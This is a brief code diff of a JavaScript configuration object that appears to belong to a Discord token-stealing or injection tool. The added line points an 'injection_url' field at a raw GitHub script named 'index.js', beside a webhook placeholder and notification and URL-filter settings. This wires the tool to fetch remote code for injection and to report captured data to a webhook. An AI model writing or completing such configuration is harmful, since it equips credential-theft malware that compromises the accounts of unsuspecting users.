@@ -26,7 +26,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "",
+    injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
